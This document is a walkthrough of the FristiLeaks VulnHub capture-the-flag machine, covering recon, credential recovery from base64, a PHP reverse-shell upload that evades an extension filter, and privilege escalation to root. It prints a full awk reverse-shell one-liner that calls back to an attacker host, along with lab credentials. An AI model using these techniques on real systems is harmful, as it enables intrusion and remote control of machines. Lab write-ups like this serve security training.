# Fristileaks

<!-- TOC -->

- [Fristileaks](#fristileaks)
    - [Recon & Enummeration](#recon--enummeration)
    - [Intitial Foothold](#intitial-foothold)
    - [Privilege Escalation](#privilege-escalation)
        - [admin](#admin)
        - [fristigod](#fristigod)
        - [root](#root)

<!-- /TOC -->

## Recon & Enummeration

```
Nmap scan report for 10.10.10.3
Host is up (0.00060s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
```

Trying `http://10.10.10.3/fristi` displays an admin portal.
Other URL's display in a mere image.

The page source displays some commented out base64, which we put in `login.base64` and decode to a PNG image file:
`cat login.base64 | tr -d '\n' | base64 -d > out.png`

Resulting in an image displaying: `keKkeKKeKKeKkEkkEk`
Also the user "eezeepz" stands out



## Intitial Foothold

- Now we can upload a file, since we logged in with `eezeepz:keKkeKKeKKeKkEkkEk`. 
- Upload a php reverse shell with filename `shell.php.png` to bypass the file extension filter
- Pop reverse shell

result: 

```
bash-4.1$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```

## Privilege Escalation


### admin
If we cat the file `/home/eezeepz/notes.txt` we can read we have command execution by putting files in the file `/tmp/runthis` which will be executed as admin user.
We create another reverse shell, this time interactive with the awk binary if `/usr/bin`:
```
/usr/bin/awk 'BEGIN {s = "/inet/tcp/0/10.10.10.4/12345"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```


### fristigod

From there we find out the admin user has a python script to "encrypt" messages:

```
connect to [10.10.10.4] from (UNKNOWN) [10.10.10.3] 39900
shell>id
uid=501(admin) gid=501(admin) groups=501(admin)
shell>cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
shell>cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
shell>cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```


 We reverse them:

 ```
 kali@kali:~/vulnhub/fristileaks$ python decryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
LetThereBeFristi!
```
```
kali@kali:~/vulnhub/fristileaks$ python decryptpass.py mVGZ3O3omkJLmy2pcuTq
thisisalsopw123
```

Our credential list is as follows:

```
eezepeez:?
fristigod:LetThereBeFristi!
admin:thisisalsopw123
```

### root

The user Fristigod has a folder `/var/fristigod/.secret_admin_stuff`.

`sudo -l` shows us we can run `doCom` as the user fristi as follows:
```
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash
```

Which will elevate us to root:
```
bash-4.1# id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
bash-4.1# cat fristileaks_secrets.txt 
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```




